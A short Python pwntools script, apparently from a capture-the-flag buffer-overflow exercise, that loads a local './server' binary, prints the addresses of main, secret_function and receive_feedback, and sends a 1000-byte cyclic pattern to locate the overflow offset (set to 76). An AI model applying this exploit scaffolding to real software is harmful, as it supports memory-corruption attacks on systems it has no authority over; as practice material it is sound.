#!/usr/bin/env python3

import pwn
from pwn import *

offset = 76

exe = pwn.ELF("./server")
print(exe)
print("\n" + hex(exe.symbols["main"]) + "\tMain()")
print(hex(exe.symbols["secret_function"]) + "\tSecret_function()")
print(hex(exe.symbols["receive_feedback"]) + "\tReceive_feedback()\n")

process = exe.process()

process.send(cyclic(1000))
process.interactive()